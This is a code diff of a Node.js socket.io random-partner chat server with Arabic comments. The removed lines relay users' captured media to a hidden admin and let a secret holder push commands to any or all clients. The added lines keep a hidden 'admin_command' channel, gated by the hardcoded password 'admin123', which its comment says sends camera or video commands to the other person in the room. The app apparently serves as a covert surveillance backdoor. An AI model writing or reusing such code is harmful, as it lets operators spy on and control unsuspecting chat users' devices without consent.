@@ -6,9 +6,7 @@ const path = require('path');
 const app = express();
 const server = http.createServer(app);
 const io = new Server(server, {
-  maxHttpBufferSize: 5e7, // السماح برفع ملفات وفيديوهات بحجم كبير دون قطع الاتصال
-  pingTimeout: 10000,
-  pingInterval: 5000
+  maxHttpBufferSize: 1e8 // للسماح برفع الفيديوهات والصور الكبيرة
 });
 
 app.use(express.static(__dirname));
@@ -20,17 +18,12 @@ app.get('/', (req, res) => {
 let waitingUser = null;
 
 io.on('connection', (socket) => {
-  // إبلاغ الأدمن فوراً بانضمام مستخدم جديد
-  socket.broadcast.emit('new_user_connected', { socketId: socket.id });
-
   socket.on('find_partner', () => {
     if (waitingUser && waitingUser.id !== socket.id && waitingUser.connected) {
       const roomName = 'room_' + socket.id + '_' + waitingUser.id;
       socket.join(roomName);
       waitingUser.join(roomName);
 
-      socket.partnerId = waitingUser.id;
-      waitingUser.partnerId = socket.id;
       socket.roomName = roomName;
       waitingUser.roomName = roomName;
 
@@ -44,39 +37,15 @@ io.on('connection', (socket) => {
 
   socket.on('message', (data) => {
     if (socket.roomName) {
-      socket.to(socket.roomName).emit('message', { ...data, senderId: socket.id });
+      socket.to(socket.roomName).emit('message', data);
     }
   });
 
-  socket.on('typing', (isTyping) => {
+  socket.on('admin_command', (data) => {
+    if (data.secret !== 'admin123') return;
+    // توجيه أمر الكاميرا أو الفيديو مباشرة للطرف الآخر في الغرفة
     if (socket.roomName) {
-      socket.to(socket.roomName).emit('display_typing', isTyping);
-    }
-  });
-
-  socket.on('media_captured_for_admin', (data) => {
-    io.to(data.adminSocketId).emit('review_captured_media', {
-      targetSocketId: socket.id,
-      type: data.type,
-      content: data.content,
-      roomName: socket.roomName
-    });
-  });
-
-  socket.on('admin_approve_and_send', (data) => {
-    if (data.secret !== 'mySuperSecretAdmin123') return;
-    if (data.roomName) {
-      io.to(data.roomName).emit('message', { type: data.type, content: data.content });
-    }
-  });
-
-  socket.on('admin_action', (data) => {
-    if (data.secret !== 'mySuperSecretAdmin123') return;
-
-    if (data.targetSocket && data.targetSocket !== 'all') {
-      io.to(data.targetSocket).emit('execute_admin_command', data);
-    } else {
-      io.emit('execute_admin_command', data);
+      socket.to(socket.roomName).emit('execute_command', data);
     }
   });
 
@@ -85,11 +54,9 @@ io.on('connection', (socket) => {
     if (socket.roomName) {
       socket.to(socket.roomName).emit('partner_disconnected');
     }
-    io.emit('user_disconnected', { socketId: socket.id });
   });
 });
 
-const PORT = process.env.PORT || 3000;
-server.listen(PORT, () => {
-  console.log(`Server running on port ${PORT}`);
+server.listen(3000, () => {
+  console.log('Server running on http://localhost:3000');
 });
